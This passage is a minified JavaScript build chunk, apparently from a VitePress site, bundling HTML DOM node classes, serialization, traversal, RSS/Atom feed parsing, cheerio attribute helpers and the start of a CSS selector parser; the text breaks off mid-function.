var Ls=Object.defineProperty;var Ds=(e,t,n)=>t in e?Ls(e,t,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[t]=n;var A=(e,t,n)=>Ds(e,typeof t!="symbol"?t+"":t,n);import{p as _n,q as Hs,a2 as X}from"./framework.5WXdMwYP.js";var N;(function(e){e.Root="root",e.Text="text",e.Directive="directive",e.Comment="comment",e.Script="script",e.Style="style",e.Tag="tag",e.CDATA="cdata",e.Doctype="doctype"})(N||(N={}));function Is(e){return e.type===N.Tag||e.type===N.Script||e.type===N.Style}const js=N.Root,Us=N.Text,Js=N.Directive,Bs=N.Comment,Fs=N.Script,Vs=N.Style,qs=N.Tag,zs=N.CDATA,$s=N.Doctype;class fa{constructor(){this.parent=null,this.prev=null,this.next=null,this.startIndex=null,this.endIndex=null}get parentNode(){return this.parent}set parentNode(t){this.parent=t}get previousSibling(){return this.prev}set previousSibling(t){this.prev=t}get nextSibling(){return this.next}set nextSibling(t){this.next=t}cloneNode(t=!1){return Fe(this,t)}}class Kt extends fa{constructor(t){super(),this.data=t}get nodeValue(){return this.data}set nodeValue(t){this.data=t}}class ua extends Kt{constructor(){super(...arguments),this.type=N.Text}get nodeType(){return 3}}class Xs extends Kt{constructor(){super(...arguments),this.type=N.Comment}get nodeType(){return 8}}class Gs extends Kt{constructor(t,n){super(n),this.name=t,this.type=N.Directive}get nodeType(){return 1}}class Qt extends fa{constructor(t){super(),this.children=t}get firstChild(){var t;return(t=this.children[0])!==null&&t!==void 0?t:null}get lastChild(){return this.children.length>0?this.children[this.children.length-1]:null}get childNodes(){return this.children}set childNodes(t){this.children=t}}class Ys extends Qt{constructor(){super(...arguments),this.type=N.CDATA}get nodeType(){return 4}}class ha extends Qt{constructor(){super(...arguments),this.type=N.Root}get nodeType(){return 9}}class Ks extends Qt{constructor(t,n,a=[],s=t==="script"?N.Script:t==="style"?N.Style:N.Tag){super(a),this.name=t,this.attribs=n,this.type=s}get nodeType(){return 1}get tagName(){return this.name}set tagName(t){this.name=t}get attributes(){return Object.keys(this.attribs).map(t=>{var n,a;return{name:t,value:this.attribs[t],namespace:(n=this["x-attribsNamespace"])===null||n===void 0?void 0:n[t],prefix:(a=this["x-attribsPrefix"])===null||a===void 0?void 0:a[t]}})}}function C(e){return Is(e)}function kt(e){return e.type===N.CDATA}function ke(e){return e.type===N.Text}function Zt(e){return e.type===N.Comment}function Qs(e){return e.type===N.Directive}function _e(e){return e.type===N.Root}function I(e){return Object.prototype.hasOwnProperty.call(e,"children")}function Fe(e,t=!1){let n;if(ke(e))n=new ua(e.data);else if(Zt(e))n=new Xs(e.data);else if(C(e)){const a=t?Lt(e.children):[],s=new Ks(e.name,{...e.attribs},a);a.forEach(r=>r.parent=s),e.namespace!=null&&(s.namespace=e.namespace),e["x-attribsNamespace"]&&(s["x-attribsNamespace"]={...e["x-attribsNamespace"]}),e["x-attribsPrefix"]&&(s["x-attribsPrefix"]={...e["x-attribsPrefix"]}),n=s}else if(kt(e)){const a=t?Lt(e.children):[],s=new Ys(a);a.forEach(r=>r.parent=s),n=s}else if(_e(e)){const a=t?Lt(e.children):[],s=new ha(a);a.forEach(r=>r.parent=s),e["x-mode"]&&(s["x-mode"]=e["x-mode"]),n=s}else if(Qs(e)){const a=new Gs(e.name,e.data);e["x-name"]!=null&&(a["x-name"]=e["x-name"],a["x-publicId"]=e["x-publicId"],a["x-systemId"]=e["x-systemId"]),n=a}else throw new Error(`Not implemented yet: ${e.type}`);return n.startIndex=e.startIndex,n.endIndex=e.endIndex,e.sourceCodeLocation!=null&&(n.sourceCodeLocation=e.sourceCodeLocation),n}function Lt(e){const t=e.map(n=>Fe(n,!0));for(let n=1;n<t.length;n++)t[n].prev=t[n-1],t[n-1].next=t[n];return t}const Nn=/["&'<>$\x80-\uFFFF]/g,Zs=new Map([[34,"&quot;"],[38,"&amp;"],[39,"&apos;"],[60,"&lt;"],[62,"&gt;"]]),er=String.prototype.codePointAt!=null?(e,t)=>e.codePointAt(t):(e,t)=>(e.charCodeAt(t)&64512)===55296?(e.charCodeAt(t)-55296)*1024+e.charCodeAt(t+1)-56320+65536:e.charCodeAt(t);function ga(e){let t="",n=0,a;for(;(a=Nn.exec(e))!==null;){const s=a.index,r=e.charCodeAt(s),o=Zs.get(r);o!==void 0?(t+=e.substring(n,s)+o,n=s+1):(t+=`${e.substring(n,s)}&#x${er(e,s).toString(16)};`,n=Nn.lastIndex+=+((r&64512)===55296))}return t+e.substr(n)}function ma(e,t){return function(a){let s,r=0,o="";for(;s=e.exec(a);)r!==s.index&&(o+=a.substring(r,s.index)),o+=t.get(s[0].charCodeAt(0)),r=s.index+1;return o+a.substring(r)}}const tr=ma(/["&\u00A0]/g,new Map([[34,"&quot;"],[38,"&amp;"],[160,"&nbsp;"]])),nr=ma(/[&<>\u00A0]/g,new Map([[38,"&amp;"],[60,"&lt;"],[62,"&gt;"],[160,"&nbsp;"]])),ar=new Map(["altGlyph","altGlyphDef","altGlyphItem","animateColor","animateMotion","animateTransform","clipPath","feBlend","feColorMatrix","feComponentTransfer","feComposite","feConvolveMatrix","feDiffuseLighting","feDisplacementMap","feDistantLight","feDropShadow","feFlood","feFuncA","feFuncB","feFuncG","feFuncR","feGaussianBlur","feImage","feMerge","feMergeNode","feMorphology","feOffset","fePointLight","feSpecularLighting","feSpotLight","feTile","feTurbulence","foreignObject","glyphRef","linearGradient","radialGradient","textPath"].map(e=>[e.toLowerCase(),e])),sr=new Map(["definitionURL","attributeName","attributeType","baseFrequency","baseProfile","calcMode","clipPathUnits","diffuseConstant","edgeMode","filterUnits","glyphRef","gradientTransform","gradientUnits","kernelMatrix","kernelUnitLength","keyPoints","keySplines","keyTimes","lengthAdjust","limitingConeAngle","markerHeight","markerUnits","markerWidth","maskContentUnits","maskUnits","numOctaves","pathLength","patternContentUnits","patternTransform","patternUnits","pointsAtX","pointsAtY","pointsAtZ","preserveAlpha","preserveAspectRatio","primitiveUnits","refX","refY","repeatCount","repeatDur","requiredExtensions","requiredFeatures","specularConstant","specularExponent","spreadMethod","startOffset","stdDeviation","stitchTiles","surfaceScale","systemLanguage","tableValues","targetX","targetY","textLength","viewBox","viewTarget","xChannelSelector","yChannelSelector","zoomAndPan"].map(e=>[e.toLowerCase(),e])),rr=new Set(["style","script","xmp","iframe","noembed","noframes","plaintext","noscript"]);function or(e){return e.replace(/"/g,"&quot;")}function pr(e,t){var n;if(!e)return;const a=((n=t.encodeEntities)!==null&&n!==void 0?n:t.decodeEntities)===!1?or:t.xmlMode||t.encodeEntities!=="utf8"?ga:tr;return Object.keys(e).map(s=>{var r,o;const p=(r=e[s])!==null&&r!==void 0?r:"";return t.xmlMode==="foreign"&&(s=(o=sr.get(s))!==null&&o!==void 0?o:s),!t.emptyAttrs&&!t.xmlMode&&p===""?s:`${s}="${a(p)}"`}).join(" ")}const An=new Set(["area","base","basefont","br","col","command","embed","frame","hr","img","input","isindex","keygen","link","meta","param","source","track","wbr"]);function en(e,t={}){const n="length"in e?e:[e];let a="";for(let s=0;s<n.length;s++)a+=lr(n[s],t);return a}function lr(e,t){switch(e.type){case js:return en(e.children,t);case $s:case Js:return xr(e);case Bs:return fr(e);case zs:return wr(e);case Fs:case Vs:case qs:return dr(e,t);case Us:return yr(e,t)}}const ir=new Set(["mi","mo","mn","ms","mtext","annotation-xml","foreignObject","desc","title"]),cr=new Set(["svg","math"]);function dr(e,t){var n;t.xmlMode==="foreign"&&(e.name=(n=ar.get(e.name))!==null&&n!==void 0?n:e.name,e.parent&&ir.has(e.parent.name)&&(t={...t,xmlMode:!1})),!t.xmlMode&&cr.has(e.name)&&(t={...t,xmlMode:"foreign"});let a=`<${e.name}`;const s=pr(e.attribs,t);return s&&(a+=` ${s}`),e.children.length===0&&(t.xmlMode?t.selfClosingTags!==!1:t.selfClosingTags&&An.has(e.name))?(t.xmlMode||(a+=" "),a+="/>"):(a+=">",e.children.length>0&&(a+=en(e.children,t)),(t.xmlMode||!An.has(e.name))&&(a+=`</${e.name}>`)),a}function xr(e){return`<${e.data}>`}function yr(e,t){var n;let a=e.data||"";return((n=t.encodeEntities)!==null&&n!==void 0?n:t.decodeEntities)!==!1&&!(!t.xmlMode&&e.parent&&rr.has(e.parent.name))&&(a=t.xmlMode||t.encodeEntities!=="utf8"?ga(a):nr(a)),a}function wr(e){return`<![CDATA[${e.children[0].data}]]>`}function fr(e){return`<!--${e.data}-->`}function ka(e,t){return en(e,t)}function ur(e,t){return I(e)?e.children.map(n=>ka(n,t)).join(""):""}function ot(e){return Array.isArray(e)?e.map(ot).join(""):C(e)?e.name==="br"?`
`:ot(e.children):kt(e)?ot(e.children):ke(e)?e.data:""}function Ee(e){return Array.isArray(e)?e.map(Ee).join(""):I(e)&&!Zt(e)?Ee(e.children):ke(e)?e.data:""}function pt(e){return Array.isArray(e)?e.map(pt).join(""):I(e)&&(e.type===N.Tag||kt(e))?pt(e.children):ke(e)?e.data:""}function Wt(e){return I(e)?e.children:[]}function Wa(e){return e.parent||null}function Sa(e){const t=Wa(e);if(t!=null)return Wt(t);const n=[e];let{prev:a,next:s}=e;for(;a!=null;)n.unshift(a),{prev:a}=a;for(;s!=null;)n.push(s),{next:s}=s;return n}function hr(e,t){var n;return(n=e.attribs)===null||n===void 0?void 0:n[t]}function gr(e,t){return e.attribs!=null&&Object.prototype.hasOwnProperty.call(e.attribs,t)&&e.attribs[t]!=null}function mr(e){return e.name}function tn(e){let{next:t}=e;for(;t!==null&&!C(t);)({next:t}=t);return t}function nn(e){let{prev:t}=e;for(;t!==null&&!C(t);)({prev:t}=t);return t}function Se(e){if(e.prev&&(e.prev.next=e.next),e.next&&(e.next.prev=e.prev),e.parent){const t=e.parent.children,n=t.lastIndexOf(e);n>=0&&t.splice(n,1)}e.next=null,e.prev=null,e.parent=null}function kr(e,t){const n=t.prev=e.prev;n&&(n.next=t);const a=t.next=e.next;a&&(a.prev=t);const s=t.parent=e.parent;if(s){const r=s.children;r[r.lastIndexOf(e)]=t,e.parent=null}}function Wr(e,t){if(Se(t),t.next=null,t.parent=e,e.children.push(t)>1){const n=e.children[e.children.length-2];n.next=t,t.prev=n}else t.prev=null}function Sr(e,t){Se(t);const{parent:n}=e,a=e.next;if(t.next=a,t.prev=e,e.next=t,t.parent=n,a){if(a.prev=t,n){const s=n.children;s.splice(s.lastIndexOf(a),0,t)}}else n&&n.children.push(t)}function br(e,t){if(Se(t),t.parent=e,t.prev=null,e.children.unshift(t)!==1){const n=e.children[1];n.prev=t,t.next=n}else t.next=null}function Tr(e,t){Se(t);const{parent:n}=e;if(n){const a=n.children;a.splice(a.indexOf(e),0,t)}e.prev&&(e.prev.next=t),t.parent=n,t.prev=e.prev,t.next=e,e.prev=t}function Xe(e,t,n=!0,a=1/0){return an(e,Array.isArray(t)?t:[t],n,a)}function an(e,t,n,a){const s=[],r=[Array.isArray(t)?t:[t]],o=[0];for(;;){if(o[0]>=r[0].length){if(o.length===1)return s;r.shift(),o.shift();continue}const p=r[0][o[0]++];if(e(p)&&(s.push(p),--a<=0))return s;n&&I(p)&&p.children.length>0&&(o.unshift(0),r.unshift(p.children))}}function Cr(e,t){return t.find(e)}function sn(e,t,n=!0){const a=Array.isArray(t)?t:[t];for(let s=0;s<a.length;s++){const r=a[s];if(C(r)&&e(r))return r;if(n&&I(r)&&r.children.length>0){const o=sn(e,r.children,!0);if(o)return o}}return null}function ba(e,t){return(Array.isArray(t)?t:[t]).some(n=>C(n)&&e(n)||I(n)&&ba(e,n.children))}function Pr(e,t){const n=[],a=[Array.isArray(t)?t:[t]],s=[0];for(;;){if(s[0]>=a[0].length){if(a.length===1)return n;a.shift(),s.shift();continue}const r=a[0][s[0]++];C(r)&&e(r)&&n.push(r),I(r)&&r.children.length>0&&(s.unshift(0),a.unshift(r.children))}}const lt={tag_name(e){return typeof e=="function"?t=>C(t)&&e(t.name):e==="*"?C:t=>C(t)&&t.name===e},tag_type(e){return typeof e=="function"?t=>e(t.type):t=>t.type===e},tag_contains(e){return typeof e=="function"?t=>ke(t)&&e(t.data):t=>ke(t)&&t.data===e}};function rn(e,t){return typeof t=="function"?n=>C(n)&&t(n.attribs[e]):n=>C(n)&&n.attribs[e]===t}function vr(e,t){return n=>e(n)||t(n)}function Ta(e){const t=Object.keys(e).map(n=>{const a=e[n];return Object.prototype.hasOwnProperty.call(lt,n)?lt[n](a):rn(n,a)});return t.length===0?null:t.reduce(vr)}function Rr(e,t){const n=Ta(e);return n?n(t):!0}function Er(e,t,n,a=1/0){const s=Ta(e);return s?Xe(s,t,n,a):[]}function Mr(e,t,n=!0){return Array.isArray(t)||(t=[t]),sn(rn("id",e),t,n)}function Ne(e,t,n=!0,a=1/0){return Xe(lt.tag_name(e),t,n,a)}function Or(e,t,n=!0,a=1/0){return Xe(rn("class",e),t,n,a)}function _r(e,t,n=!0,a=1/0){return Xe(lt.tag_type(e),t,n,a)}function Nr(e){let t=e.length;for(;--t>=0;){const n=e[t];if(t>0&&e.lastIndexOf(n,t-1)>=0){e.splice(t,1);continue}for(let a=n.parent;a;a=a.parent)if(e.includes(a)){e.splice(t,1);break}}return e}var te;(function(e){e[e.DISCONNECTED=1]="DISCONNECTED",e[e.PRECEDING=2]="PRECEDING",e[e.FOLLOWING=4]="FOLLOWING",e[e.CONTAINS=8]="CONTAINS",e[e.CONTAINED_BY=16]="CONTAINED_BY"})(te||(te={}));function Ca(e,t){const n=[],a=[];if(e===t)return 0;let s=I(e)?e:e.parent;for(;s;)n.unshift(s),s=s.parent;for(s=I(t)?t:t.parent;s;)a.unshift(s),s=s.parent;const r=Math.min(n.length,a.length);let o=0;for(;o<r&&n[o]===a[o];)o++;if(o===0)return te.DISCONNECTED;const p=n[o-1],l=p.children,i=n[o],d=a[o];return l.indexOf(i)>l.indexOf(d)?p===t?te.FOLLOWING|te.CONTAINED_BY:te.FOLLOWING:p===e?te.PRECEDING|te.CONTAINS:te.PRECEDING}function Ae(e){return e=e.filter((t,n,a)=>!a.includes(t,n+1)),e.sort((t,n)=>{const a=Ca(t,n);return a&te.PRECEDING?-1:a&te.FOLLOWING?1:0}),e}function Ar(e){const t=it(jr,e);return t?t.name==="feed"?Lr(t):Dr(t):null}function Lr(e){var t;const n=e.children,a={type:"atom",items:Ne("entry",n).map(o=>{var p;const{children:l}=o,i={media:Pa(l)};G(i,"id","id",l),G(i,"title","title",l);const d=(p=it("link",l))===null||p===void 0?void 0:p.attribs.href;d&&(i.link=d);const f=de("summary",l)||de("content",l);f&&(i.description=f);const y=de("updated",l);return y&&(i.pubDate=new Date(y)),i})};G(a,"id","id",n),G(a,"title","title",n);const s=(t=it("link",n))===null||t===void 0?void 0:t.attribs.href;s&&(a.link=s),G(a,"description","subtitle",n);const r=de("updated",n);return r&&(a.updated=new Date(r)),G(a,"author","email",n,!0),a}function Dr(e){var t,n;const a=(n=(t=it("channel",e.children))===null||t===void 0?void 0:t.children)!==null&&n!==void 0?n:[],s={type:e.name.substr(0,3),id:"",items:Ne("item",e.children).map(o=>{const{children:p}=o,l={media:Pa(p)};G(l,"id","guid",p),G(l,"title","title",p),G(l,"link","link",p),G(l,"description","description",p);const i=de("pubDate",p)||de("dc:date",p);return i&&(l.pubDate=new Date(i)),l})};G(s,"title","title",a),G(s,"link","link",a),G(s,"description","description",a);const r=de("lastBuildDate",a);return r&&(s.updated=new Date(r)),G(s,"author","managingEditor",a,!0),s}const Hr=["url","type","lang"],Ir=["fileSize","bitrate","framerate","samplingrate","channels","duration","height","width"];function Pa(e){return Ne("media:content",e).map(t=>{const{attribs:n}=t,a={medium:n.medium,isDefault:!!n.isDefault};for(const s of Hr)n[s]&&(a[s]=n[s]);for(const s of Ir)n[s]&&(a[s]=parseInt(n[s],10));return n.expression&&(a.expression=n.expression),a})}function it(e,t){return Ne(e,t,!0,1)[0]}function de(e,t,n=!1){return Ee(Ne(e,t,n,1)).trim()}function G(e,t,n,a,s=!1){const r=de(n,a,s);r&&(e[t]=r)}function jr(e){return e==="rss"||e==="feed"||e==="rdf:RDF"}const St=Object.freeze(Object.defineProperty({__proto__:null,get DocumentPosition(){return te},append:Sr,appendChild:Wr,compareDocumentPosition:Ca,existsOne:ba,filter:Xe,find:an,findAll:Pr,findOne:sn,findOneChild:Cr,getAttributeValue:hr,getChildren:Wt,getElementById:Mr,getElements:Er,getElementsByClassName:Or,getElementsByTagName:Ne,getElementsByTagType:_r,getFeed:Ar,getInnerHTML:ur,getName:mr,getOuterHTML:ka,getParent:Wa,getSiblings:Sa,getText:ot,hasAttrib:gr,hasChildren:I,innerText:pt,isCDATA:kt,isComment:Zt,isDocument:_e,isTag:C,isText:ke,nextElementSibling:tn,prepend:Tr,prependChild:br,prevElementSibling:nn,removeElement:Se,removeSubsets:Nr,replaceElement:kr,testElement:Rr,textContent:Ee,uniqueSort:Ae},Symbol.toStringTag,{value:"Module"}));function ct(e){const t=e??(this?this.root():[]);let n="";for(let a=0;a<t.length;a++)n+=Ee(t[a]);return n}function Ur(e,t){if(t===e)return!1;let n=t;for(;n&&n!==n.parent;)if(n=n.parent,n===e)return!0;return!1}function Le(e){return e.cheerio!=null}function Jr(e){return e.replace(/[._-](\w|$)/g,(t,n)=>n.toUpperCase())}function Br(e){return e.replace(/[A-Z]/g,"-$&").toLowerCase()}function H(e,t){const n=e.length;for(let a=0;a<n;a++)t(e[a],a);return e}var ge;(function(e){e[e.LowerA=97]="LowerA",e[e.LowerZ=122]="LowerZ",e[e.UpperA=65]="UpperA",e[e.UpperZ=90]="UpperZ",e[e.Exclamation=33]="Exclamation"})(ge||(ge={}));function Fr(e){const t=e.indexOf("<");if(t<0||t>e.length-3)return!1;const n=e.charCodeAt(t+1);return(n>=ge.LowerA&&n<=ge.LowerZ||n>=ge.UpperA&&n<=ge.UpperZ||n===ge.Exclamation)&&e.includes(">",t+2)}const Ve=Object.prototype.hasOwnProperty,qe=/\s+/,Vt="data-",on=/^(?:autofocus|autoplay|async|checked|controls|defer|disabled|hidden|loop|multiple|open|readonly|required|scoped|selected)$/i,Vr=/^{[^]*}$|^\[[^]*]$/;function dt(e,t,n){var a;if(!(!e||!C(e))){if((a=e.attribs)!==null&&a!==void 0||(e.attribs={}),!t)return e.attribs;if(Ve.call(e.attribs,t))return!n&&on.test(t)?t:e.attribs[t];if(e.name==="option"&&t==="value")return ct(e.children);if(e.name==="input"&&(e.attribs.type==="radio"||e.attribs.type==="checkbox")&&t==="value")return"on"}}function Re(e,t,n){n===null?Ra(e,t):e.attribs[t]=`${n}`}function qr(e,t){if(typeof e=="object"||t!==void 0){if(typeof t=="function"){if(typeof e!="string")throw new Error("Bad combination of arguments.");return H(this,(n,a)=>{C(n)&&Re(n,e,t.call(n,a,n.attribs[e]))})}return H(this,n=>{if(C(n))if(typeof e=="object")for(const a of Object.keys(e)){const s=e[a];Re(n,a,s)}else Re(n,e,t)})}return arguments.length>1?this:dt(this[0],e,this.options.xmlMode)}function Ln(e,t,n){return t in e?e[t]:!n&&on.test(t)?dt(e,t,!1)!==void 0:dt(e,t,n)}function Dt(e,t,n,a){t in e?e[t]=n:Re(e,t,!a&&on.test(t)?n?"":null:`${n}`)}function zr(e,t){var n;if(typeof e=="string"&&t===void 0){const a=this[0];if(!a||!C(a))return;switch(e){case"style":{const s=this.css(),r=Object.keys(s);for(let o=0;o<r.length;o++)s[o]=r[o];return s.length=r.length,s}case"tagName":case"nodeName":return a.name.toUpperCase();case"href":case"src":{const s=(n=a.attribs)===null||n===void 0?void 0:n[e];return typeof URL<"u"&&(e==="href"&&(a.tagName==="a"||a.tagName==="link")||e==="src"&&(a.tagName==="img"||a.tagName==="iframe"||a.tagName==="audio"||a.tagName==="video"||a.tagName==="source"))&&s!==void 0&&this.options.baseURI?new URL(s,this.options.baseURI).href:s}case"innerText":return pt(a);case"textContent":return Ee(a);case"outerHTML":return this.clone().wrap("<container />").parent().html();case"innerHTML":return this.html();default:return Ln(a,e,this.options.xmlMode)}}if(typeof e=="object"||t!==void 0){if(typeof t=="function"){if(typeof e=="object")throw new TypeError("Bad combination of arguments.");return H(this,(a,s)=>{C(a)&&Dt(a,e,t.call(a,s,Ln(a,e,this.options.xmlMode)),this.options.xmlMode)})}return H(this,a=>{if(C(a))if(typeof e=="object")for(const s of Object.keys(e)){const r=e[s];Dt(a,s,r,this.options.xmlMode)}else Dt(a,e,t,this.options.xmlMode)})}}function Dn(e,t,n){var a;(a=e.data)!==null&&a!==void 0||(e.data={}),typeof t=="object"?Object.assign(e.data,t):typeof t=="string"&&n!==void 0&&(e.data[t]=n)}function $r(e){for(const t of Object.keys(e.attribs)){if(!t.startsWith(Vt))continue;const n=Jr(t.slice(Vt.length));Ve.call(e.data,n)||(e.data[n]=va(e.attribs[t]))}return e.data}function Xr(e,t){const n=Vt+Br(t),a=e.data;if(Ve.call(a,t))return a[t];if(Ve.call(e.attribs,n))return a[t]=va(e.attribs[n])}function va(e){if(e==="null")return null;if(e==="true")return!0;if(e==="false")return!1;const t=Number(e);if(e===String(t))return t;if(Vr.test(e))try{return JSON.parse(e)}catch{}return e}function Gr(e,t){var n;const a=this[0];if(!a||!C(a))return;const s=a;return(n=s.data)!==null&&n!==void 0||(s.data={}),e==null?$r(s):typeof e=="object"||t!==void 0?(H(this,r=>{C(r)&&(typeof e=="object"?Dn(r,e):Dn(r,e,t))}),this):Xr(s,e)}function Yr(e){const t=arguments.length===0,n=this[0];if(!n||!C(n))return t?void 0:this;switch(n.name){case"textarea":return this.text(e);case"select":{const a=this.find("option:selected");if(!t){if(this.attr("multiple")==null&&typeof e=="object")return this;this.find("option").removeAttr("selected");const s=typeof e=="object"?e:[e];for(const r of s)this.find(`option[value="${r}"]`).attr("selected","");return this}return this.attr("multiple")?a.toArray().map(s=>ct(s.children)):a.attr("value")}case"input":case"option":return t?this.attr("value"):this.attr("value",e)}}function Ra(e,t){!e.attribs||!Ve.call(e.attribs,t)||delete e.attribs[t]}function xt(e){return e?e.trim().split(qe):[]}function Kr(e){const t=xt(e);for(const n of t)H(this,a=>{C(a)&&Ra(a,n)});return this}function Qr(e){return this.toArray().some(t=>{const n=C(t)&&t.attribs.class;let a=-1;if(n&&e.length>0)for(;(a=n.indexOf(e,a+1))>-1;){const s=a+e.length;if((a===0||qe.test(n[a-1]))&&(s===n.length||qe.test(n[s])))return!0}return!1})}function Ea(e){if(typeof e=="function")return H(this,(a,s)=>{if(C(a)){const r=a.attribs.class||"";Ea.call([a],e.call(a,s,r))}});if(!e||typeof e!="string")return this;const t=e.split(qe),n=this.length;for(let a=0;a<n;a++){const s=this[a];if(!C(s))continue;const r=dt(s,"class",!1);if(r){let o=` ${r} `;for(const p of t){const l=`${p} `;o.includes(` ${l}`)||(o+=l)}Re(s,"class",o.trim())}else Re(s,"class",t.join(" ").trim())}return this}function Ma(e){if(typeof e=="function")return H(this,(s,r)=>{C(s)&&Ma.call([s],e.call(s,r,s.attribs.class||""))});const t=xt(e),n=t.length,a=arguments.length===0;return H(this,s=>{if(C(s))if(a)s.attribs.class="";else{const r=xt(s.attribs.class);let o=!1;for(let p=0;p<n;p++){const l=r.indexOf(t[p]);l>=0&&(r.splice(l,1),o=!0,p--)}o&&(s.attribs.class=r.join(" "))}})}function Oa(e,t){if(typeof e=="function")return H(this,(o,p)=>{C(o)&&Oa.call([o],e.call(o,p,o.attribs.class||"",t),t)});if(!e||typeof e!="string")return this;const n=e.split(qe),a=n.length,s=typeof t=="boolean"?t?1:-1:0,r=this.length;for(let o=0;o<r;o++){const p=this[o];if(!C(p))continue;const l=xt(p.attribs.class);for(let i=0;i<a;i++){const d=l.indexOf(n[i]);s>=0&&d<0?l.push(n[i]):s<=0&&d>=0&&l.splice(d,1)}p.attribs.class=l.join(" ")}return this}const Zr=Object.freeze(Object.defineProperty({__proto__:null,addClass:Ea,attr:qr,data:Gr,hasClass:Qr,prop:zr,removeAttr:Kr,removeClass:Ma,toggleClass:Oa,val:Yr},Symbol.toStringTag,{value:"Module"}));var S;(function(e){e.Attribute="attribute",e.Pseudo="pseudo",e.PseudoElement="pseudo-element",e.Tag="tag",e.Universal="universal",e.Adjacent="adjacent",e.Child="child",e.Descendant="descendant",e.Parent="parent",e.Sibling="sibling",e.ColumnCombinator="column-combinator"})(S||(S={}));var J;(function(e){e.Any="any",e.Element="element",e.End="end",e.Equals="equals",e.Exists="exists",e.Hyphen="hyphen",e.Not="not",e.Start="start"})(J||(J={}));const Hn=/^[^\\#]?(?:\\(?:[\da-f]{1,6}\s?|.)|[\w\-\u00b0-\uFFFF])+/,eo=/\\([\da-f]{1,6}\s?|(\s)|.)/gi,to=new Map([[126,J.Element],[94,J.Start],[36,J.End],[42,J.Any],[33,J.Not],[124,J.Hyphen]]),no=new Set(["has","not","matches","is","where","host","host-context"]);function Ue(e){switch(e.type){case S.Adjacent:case S.Child:case S.Descendant:case S.Parent:case S.Sibling:case S.ColumnCombinator:return!0;default:return!1}}const ao=new Set(["contains","icontains"]);function so(e,t,n){const a=parseInt(t,16)-65536;return a!==a||n?t:a<0?String.fromCharCode(a+65536):String.fromCharCode(a>>10|55296,a&1023|56320)}function He(e){return e.replace(eo,so)}function Ht(e){return e===39||e===34}function In(e){return e===32||e===9||e===10||e===12||e===13}function bt(e){const t=[],n=_a(t,`${e}`,0);if(n<e.length)throw new Error(`Unmatched selector: ${e.slice(n)}`);return t}function _a(e,t,n){let a=[];function s(y){const h=t.slice(n+y).match(Hn);if(!h)throw new Error(`Expected name, found ${t.slice(n)}`);const[m]=h;return n+=y+m.length,He(m)}function r(y){for(n+=y;n<t.length&&In(t.charCodeAt(n));)n++}function o(){n+=1;const y=n;let h=1;for(;h>0&&n<t.length;n++)t.charCodeAt(n)===40&&!p(n)?h++:t.charCodeAt(n)===41&&!p(n)&&h--;if(h)throw new Error("Parenthesis not matched");return He(t.slice(y,n-1))}function p(y){let h=0;for(;t.charCodeAt(--y)===92;)h++;return(h&1)===1}function l(){if(a.length>0&&Ue(a[a.length-1]))throw new Error("Did not expect successive traversals.")}function i(y){if(a.length>0&&a[a.length-1].type===S.Descendant){a[a.length-1].type=y;return}l(),a.push({type:y})}function d(y,h){a.push({type:S.Attribute,name:y,action:h,value:s(1),namespace:null,ignoreCase:"quirks"})}function f(){if(a.length&&a[a.length-1].type===S.Descendant&&a.pop(),a.length===0)throw new Error("Empty sub-selector");e.push(a)}if(r(0),t.length===n)return n;e:for(;n<t.length;){const y=t.charCodeAt(n);switch(y){case 32:case 9:case 10:case 12:case 13:{(a.length===0||a[0].type!==S.Descendant)&&(l(),a.push({type:S.Descendant})),r(1);break}case 62:{i(S.Child),r(1);break}case 60:{i(S.Parent),r(1);break}case 126:{i(S.Sibling),r(1);break}case 43:{i(S.Adjacent),r(1);break}case 46:{d("class",J.Element);break}case 35:{d("id",J.Equals);break}case 91:{r(1);let h,m=null;t.charCodeAt(n)===124?h=s(1):t.startsWith("*|",n)?(m="*",h=s(2)):(h=s(0),t.charCodeAt(n)===124&&t.charCodeAt(n+1)!==61&&(m=h,h=s(1))),r(0);let b=J.Exists;const j=to.get(t.charCodeAt(n));if(j){if(b=j,t.charCodeAt(n+1)!==61)throw new Error("Expected `=`");r(2)}else t.charCodeAt(n)===61&&(b=J.Equals,r(1));let le="",Y=null;if(b!=="exists"){if(Ht(t.charCodeAt(n))){const Q=t.charCodeAt(n);let B=n+1;for(;B<t.length&&(t.charCodeAt(B)!==Q||p(B));)B+=1;if(t.charCodeAt(B)!==Q)throw new Error("Attribute value didn't end");le=He(t.slice(n+1,B)),n=B+1}else{const Q=n;for(;n<t.length&&(!In(t.charCodeAt(n))&&t.charCodeAt(n)!==93||p(n));)n+=1;le=He(t.slice(Q,n))}r(0);const K=t.charCodeAt(n)|32;K===115?(Y=!1,r(1)):K===105&&(Y=!0,r(1))}if(t.charCodeAt(n)!==93)throw new Error("Attribute selector didn't terminate");n+=1;const se={type:S.Attribute,name:h,action:b,value:le,namespace:m,ignoreCase:Y};a.push(se);break}case 58:{if(t.charCodeAt(n+1)===58){a.push({type:S.PseudoElement,name:s(2).toLowerCase(),data:t.charCodeAt(n)===40?o():null});continue}const h=s(1).toLowerCase();let m=null;if(t.charCodeAt(n)===40)if(no.has(h)){if(Ht(t.charCodeAt(n+1)))throw new Error(`Pseudo-selector ${h} cannot be quoted`);if(m=[],n=_a(m,t,n+1),t.charCodeAt(n)!==41)throw new Error(`Missing closing parenthesis in :${h} (${t})`);n+=1}else{if(m=o(),ao.has(h)){const b=m.charCodeAt(0);b===m.charCodeAt(m.length-1)&&Ht(b)&&(m=m.slice(1,-1))}m=He(m)}a.push({type:S.Pseudo,name:h,data:m});break}case 44:{f(),a=[],r(1);break}default:{if(t.startsWith("/*",n)){const b=t.indexOf("*/",n+2);if(b<0)throw new Error("Comment was not terminated");n=b+2,a.length===0&&r(0);break}let h=null,m;if(y===42)n+=1,m="*";else if(y===124){if(m="",t.charCodeAt(n+1)===124){i(S.ColumnCombinator),r(2);break}}else if(Hn.test(t.slice(n)))m=s(0);else break e;t.charCodeAt(n)===124&&t.charCodeAt(n+1)!==124&&(h=m,t.charCodeAt(n+1)===42?(m="*",n+=2):m=s(1)),a.push(m==="*"?{type:S.Universal,namespace:h}:{type:S.Tag,name:m,namespace:h})}}}return f(),n}function Na(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}var yt={trueFunc:function(){return!0},falseFunc:function(){return!1}};const R=Na(yt),Aa=new Map([[S.Universal,50],[S.Tag,30],[S.Attribute,1],[S.Pseudo,0]]);function pn(e){return!Aa.has(e.type)}const ro=new Map([[J.Exists,10],[J.Equals,8],[J.Not,7],[J.Start,6],[J.End,6],[J.Any,5]]);function oo(e){const t=e.map(La);for(let 